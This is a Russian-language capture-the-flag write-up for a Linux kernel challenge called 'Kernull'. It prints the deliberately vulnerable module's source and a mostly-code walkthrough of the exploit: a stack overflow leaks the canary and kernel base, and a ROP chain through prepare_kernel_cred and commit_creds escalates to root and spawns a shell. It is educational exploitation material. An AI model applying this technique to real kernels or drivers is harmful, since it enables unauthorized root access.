# Kernull

## Problem

Задание представляет собой классический таск на эксплуатацию ядра Linux с одной особенностью.

Давайте рассмотрим исходный код модуля, который использовался в данном задании.

```c
struct file_operations module_fops =
  {
   owner:   THIS_MODULE, read:    module_read,
   write:   module_write,
   open:    module_open,
   release: module_close,
   lock:    module_lock,
  };
.......
static ssize_t module_read(struct file *file, char __user *buf, size_t count, loff_t *f_pos) {
  char kbuf[MAX_SIZE] = { 0 };
  printk(KERN_INFO "module_read called\n");

  if (count >= MAX_SIZE) {
    memcpy(kbuf, globalBuffer, MAX_SIZE);
  } else {
      memcpy(kbuf, globalBuffer, count);
  }

  if (lock) {
      printk(KERN_INFO "ERROR: reading failed");
      return -EINVAL;
  }

  if (_copy_to_user(buf, kbuf, count)) {
    printk(KERN_INFO "ERROR: copy_to_user failed\n");
    return -EINVAL;
  }

  return count;
}

static ssize_t module_write(struct file *file, const char __user *buf, size_t count, loff_t *f_pos) {
    char kbuf[MAX_SIZE] = { 0 };

  printk(KERN_INFO "module_write called\n");

  if (count > MAX_SIZE && !lock) {
      printk(KERN_INFO "ERROR: writing failed");
      return -EINVAL;
  }
//
  if (_copy_from_user(kbuf, buf, count)) {
    printk(KERN_INFO "ERROR: copy_from_user failed\n");
    return -EINVAL;
  }
  memcpy(globalBuffer, kbuf, MAX_SIZE);

  return count;
}

static int module_lock(struct file *, int, struct file_lock *) {
    pr_info("Lock state: %d", lock);
    lock = lock != 1;
    return 0;
}
```

Первым же делом мы замечаем явное нарушение логики как в функции чтения, так и в функции записи: обе операции используются с буфером фиксированной длины, в то время как пользователь может контролировать длину как чтения, так и записи.

```c
    char kbuf[MAX_SIZE] = { 0 };
    _copy_from_user(kbuf, buf, count);
    ....
    _copy_to_user(buf, kbuf, count);
```

Также во избежании Ctrl-C, Ctrl-V эксплойтов в задаче присутствует глобальная переменная `lock`, которая, буду активированной не дает произвести чтение и останавливает запись, будучи деактивированной.
```c
  if (lock) {
      printk(KERN_INFO "ERROR: reading failed");
      return -EINVAL;
  }

  if (count > MAX_SIZE && !lock) {
      printk(KERN_INFO "ERROR: writing failed");
      return -EINVAL;
  }
```
 Данная мера довольно просто обходится: в эксплойте перед чтением и запись необходимо будет вызвать фунцию `lockf(fd, 0, 0)`, где `fd` - файловый дескриптор, полученный из функции `open()`.

### Exploitation

#### Open device

Сначала получим доступ к модулю, открыв его функцией `open()`.

```c
int fd = open("/dev/kernull", O_RDWR);
    if (fd == -1) {
        puts("FAIL");
        return 1;
    }
```
#### Getting the leak

Затем получим базовый адрес ядра, используя переполнение во время чтения, поскольку в задании включен KASLR.

```c
    char buf[0x600];
    read(fd, buf, 0x410);

    canary = *(size_t *)&buf[0x400];
    long long leak = *(unsigned long *)&buf[0x408];
    printf("[+] leak: %p\n", leak);
    printf("[+] canary: %p\n", canary);

    long long kbase = leak - 0x92 - (0xffffffff81209310 - 0xffffffff81000000);
    printf("[+] kernel base is at: %p\n", kbase);
```

Значение стековой канарейки уже лежит в нашем буфере, поэтому для эксплуатации мы будем использовать его же.
Все гаджеты получим при помощь `ROPgadget` использованном на нашем `vmlinux`. (Для того чтобы достать ELF файл vmlinux из сжатого ядра можно воспользоваться [этим скриптом](https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux?_x_tr_sl=auto&_x_tr_tl=ru&_x_tr_hl=ru&_x_tr_pto=wapp)). 

```bash
Kernull/src [main●] » ./extract_kernel.sh bzImage > vmlinux
Kernull/src [main●] » ls
extract_kernel.sh  bzImage  module  root  vmlinux
Kernull/src [main●] » ROPgadget vmlinux | grep 'mov rdi, rax' | grep 'ret' | head -n 3
0xffffffff82f961da : add byte ptr [rax], al ; mov rdi, rax ; rep movsd dword ptr [rdi], dword ptr [rsi] ; ret
0xffffffff81c689e9 : add byte ptr [rax], al ; mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret
0xffffffff82f961d8 : add byte ptr [rdx], al ; add byte ptr [rax], al ; mov rdi, rax ; rep movsd dword ptr [rdi], dword ptr [rsi] ; ret
Kernull/src [main●] »
```

Сам ROP-chain довольно простой

```c
    unsigned long *rop_chain = (unsigned long *)&buf[0x408];
    *rop_chain++ = pop_rdi;
    *rop_chain++ = 0;
    *rop_chain++ = prepare_kernel_cred;
    *rop_chain++ = mov_rdi_rax;
    *rop_chain++ = commit_creds;
    *rop_chain++ = trampoline;
    *rop_chain++ = 0x414141414141414;
    *rop_chain++ = 0x414141414141414;
    *rop_chain++ = (unsigned long) &spawnShell;
    *rop_chain++ = user_cs;
    *rop_chain++ = user_rflags;
    *rop_chain++ = user_rsp;
    *rop_chain++ = user_ss;
```
Рассмотрим, что тут происходит:

 - Вызов prepare_kernel_cred(0), который вернет нам адрес структуры task_cred с правами root.
 - Вызов commit_creds() c полученной структурой - это повысит наши привилегии до root.
 - Вызов KPTI-trampoline для успешного возвращения в Userspace
 - И вызов функции, которая запустит для нас shell с уже повышенными правами, вместе с возвратом значений регистров.

Код функции `spawnShell`

```c
static void spawnShell() {
  char *argv[] = { "/bin/sh", NULL };
  execve("/bin/sh", argv, NULL);
}
```
Полный код эксплойта есть в репозитории.

## Послесловие

Если все эти слова для вас ничего не значат и вы не понимаете, что происходит, не следует расстраиваться. Данный write-up рассчитан на людей, которые имели опыт в эксплуатации ядра. Я советую вам ознакомиться с [этим](https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/) замечательным циклом и вернуться к этому врайтапу.
